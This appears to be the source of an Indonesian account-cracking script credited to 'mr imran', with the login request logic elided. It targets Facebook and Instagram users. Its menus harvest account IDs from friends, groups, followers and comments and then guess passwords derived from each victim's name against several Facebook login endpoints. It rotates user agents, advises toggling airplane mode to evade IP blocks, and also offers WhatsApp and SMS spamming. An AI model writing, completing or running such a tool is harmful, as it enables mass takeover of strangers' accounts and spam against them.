...
| |_ / /_\ \ /  \/| |__ | |_/ /| | | || | | | |/ /     |  |   telegram @mr_danger_x  https://t.me/we_are_haker
|  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |   Script By mr imran 
...
def menu(my_name,my_id):
	...
	dia.append(panel(f'[bold white][•[/][bold white]][/] [bold white]USERNAME : [bold purple]{my_name}[/]\n[bold white][•[/][bold white]][/] [bold white]USER IDZ : [bold purple]{my_id}[/]\n[bold white][•[/][bold white]][/] [bold white]TANGGAL  : [bold purple]{day}[/][/]\n[bold white][•[/][bold white]][/] [bold white]STATUS   : [bold red]PREMIUM[/][/]\n[bold white][•[/][bold white]][/] [bold white]VERSI SC : [bold purple]UPDATE 1.0[/][/] ',width=44,padding=(0,3),style=f"bold white"))
	dia.append(panel(f'[bold white][•[/][bold white]][/] [bold white]COUNTRY  : [bold purple]{negara}[/]\n[bold white][•[/][bold white]][/] [bold white]CITY     : [bold purple]{asal_kota}[/]\n[bold white][•[/][bold white]][/] [bold white]REGION   : [bold purple]{asal_reg}[/][/]\n[bold white][•[/][bold white]][/] [bold white]TIMEZONE : [bold purple]{times}[/][/]\n[bold white][•[/][bold white]][/] [bold white]MY IP    : [bold purple]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	console.print(Columns(dia))
	cetak(panel(f"[bold white][[bold purple]01[bold white]] CRACK FROM FRIENDS     [bold white][[bold purple]06[bold white]] CRACK FROM USERNAME[bold white]      [[bold purple]11[bold white]] GET HEADERS      \n[bold white][[bold purple]02[bold white]] CRACK FROM MASSAL      [bold white][[bold purple]07[bold white]] CRACK FROM FOLLOWERS     [[bold purple]12[bold white]] SPAM WHATSAPP      \n[bold white][[bold purple]03[bold white]] CRACK FROM GROUPS      [[bold purple]08[bold white]] CRACK FROM COMMENT       [bold white][[bold purple]13[bold white]] SPAM SMS \n[bold white][[bold purple]04[bold white]] CRACK FROM EMAIL       [bold white][[bold purple]09[bold white]] CHECK OPSI CHECKPOIN [bold white]    [[bold purple]14[bold white]] DUMP ID \n[bold white][[bold purple]05[bold white]] CRACK FROM FILES       [bold white][[bold purple]10[bold white]] [bold white]CHECK RESULT CRACK [bold white]      [[bold purple]15[bold white]] [bold red]DELETE COOKIES",width=90,title=f"[bold purple]AraiiXyzz",style=f"bold white"))
	cetak(panel(f"Ketik[bold purple] Instagram[bold white] Untuk Masuk Ke Menu Instagram",width=90,style=f"bold white"))
	...
	if _____brayennn___xd____ in ['1','01']:
		...
		dumpid()
	elif _____brayennn___xd____ in ['instagram','Instagram','ig','IG']:
		loginCookie()
...
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[bold purple]01[bold white]] Crack Username                   [[bold purple]03[bold white]] Crack File \n[[bold purple]02[bold white]] Crack Followers                  [[bold purple]04[bold white]] Crack Email ",width=90,title=f"[bold purple]Menu Crack",padding=(0,8),style=f"bold white"))
	bray = input(f' [•] Pilih Menu Crack : ')
	if bray in(''):
		print(' [•] Salah Pilih luhh');exit()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		pengikut()
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold purple]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold purple]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold purple]List Menu Cek[/][bold white][/]",style=f"bold white"))
	kz = input(f' [•] Pilih : ')
	if kz in ['2','02']:
...
def brayen_dump():
	try:
		...
		exit()
	cetak(panel('\t            [bold white]Ketik [bold purple]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold white]Ketik [bold purple]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold purple]Crack Massal",style=f"bold white"))
...
def setting():
	print('')
	cetak(panel(f'[bold white][[bold purple]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold purple]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold purple]Very Recommended[bold white]][/]\n[bold white][[bold purple]03[/][bold white]][/] [bold white]Crack Idz Random [[bold purple]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold purple]Setting Urutan Idz",style=f"bold white"))
	...
	if hu in ['1','01']:
		...
		exit()
	urut = []
	urut.append(panel(f'[bold white][[bold purple]01[/][bold white]][/] [bold white]Login Site [bold purple]m.facebook.com[bold white] [/]\n[bold white][[bold purple]02[/][bold white]][/] [bold white]Login Site [bold purple]mbasic.facebook.com[bold white] [/]\n[bold white][[bold purple]03[/][bold white]][/] [bold white]Login Site [bold purple]free.facebook.com[bold white] ',width=42,title=f"[bold purple]Validate",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold purple]04[/][bold white]][/] [bold white]Login Site [bold purple]m.facebook.com[bold white] [/]\n[bold white][[bold purple]05[/][bold white]][/] [bold white]Login Site [bold purple]mbasic.facebook.com[bold white] [/]\n[bold white][[bold purple]06[/][bold white]][/] [bold white]Login Site [bold purple]free.facebook.com[bold white] ',width=42,title=f"[bold purple]Reguler[bold white]",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold purple]07[/][bold white]][/] [bold white]Login Site [bold purple]m.facebook.com[bold white] [/]\n[bold white][[bold purple]08[/][bold white]][/] [bold white]Login Site [bold purple]m.alpha.facebook.com[bold white] ',width=42,title=f"[bold purple]Alpha And Async",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold purple]09[/][bold white]][/] [bold white]Login Site [bold purple]x.facebook.com[bold white] [/]\n[bold white][[bold purple]10[/][bold white]][/] [bold white]Login Site [bold purple]d.facebook.com[bold white] ',width=42,title=f"[bold purple]Old Metode",style=f"bold white"))
	...
	if hc in ['1','01']:
		...
		method.append('validate1')
	cetak(panel('''[bold white][[bold purple]01[bold white]] [bold white]Menggunakan Password V1 [[bold purple]Recommended[bold white]]
[bold white][[bold purple]02[bold white]] [bold white]Menggunakan Password V2 [[bold purple]Very Recommended[bold white]]
[bold white][[bold purple]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold purple]Setting Password',padding=(0,8),width=90))
	...
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold purple]AraiiXyz - Apk",style=f"bold white"))
	...
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold purple]Pilih Opsi",style=f"bold white"))
	_brayen_ = input(' [•] Pilih : ')
	if _brayen_ in ['']:
		print(' [•] Salah Pilih luhh')
		exit()
	...
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold purple]Setting User-Agent",style=f"bold white"))
...
def passwrd():
	...
	print('')
	urut = []
	urut.append(panel(f'        [bold purple]%s [bold white]'%(okc),width=44,title=f"[bold purple]OK SAVE IN",style=f"bold white"))
	urut.append(panel(f'         [bold red]%s [bold white]'%(cpc),width=44,title=f"[bold red]CP SAVE IN",style=f"bold white"))
	wa.print(Columns(urut))
	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold purple]Informasi",subtitle=f"[bold purple]Proses Crack",style=f"bold white"))
...
def colmek1(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]X[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def colmek2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]d[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
class instagram:
	...
	def logo(self):
		for i in external:
			...
			prints(Panel(f"{P2}[[bold purple]01{P2}]. Dump Id Pencarian Nama       {P2}[[bold purple]05{P2}]. Lihat Hasil Crack\n{P2}[[bold purple]02{P2}]. Dump Id Pengikut             {P2}[[bold purple]06{P2}]. Bot Auto Unfollow\n{P2}[[bold purple]03{P2}]. Dump Id Mengikuti            {P2}[[bold purple]07{P2}]. Report Bug Script\n{P2}[[bold purple]04{P2}]. Crack Ulang Hasil Cp         {P2}[[bold purple]00{P2}]. Keluar Tools",width=90,padding=(0,4),style=f"bold white"))
...
#------------------[ PILIH METODE AND PASSWORD ]-------------------#
	def ifo(self):
		urut = []
		urut.append(Panel(f"{P2}[[bold purple]01{P2}] Methode API ",padding=(0,11),style=f"bold white"))
		urut.append(Panel(f"{P2}[[bold purple]02{P2}] Methode AJAX",padding=(0,11),style=f"bold white"))
		console.print(Columns(urut))
	...
	def passwordAPI(self,xnx):
		...
		if u in ["1","01"]:
			...
			method.append('satu')
		prints(Panel(f"{P2}[[bold purple]01{P2}] Name,Name123,Name1234\n[[bold purple]02{P2}] Name,Name123,Name1234,Name12345\n[[bold purple]03{P2}] Name,Name123,Name1234,Name12345,Name123456\n[[bold purple]04{P2}] Name,Name12,Name123,Name1234,Name12345,Name123456\n[[bold purple]05{P2}] Password Manual",width=90,padding=(0,3),title='List Password',style=f"bold white"))
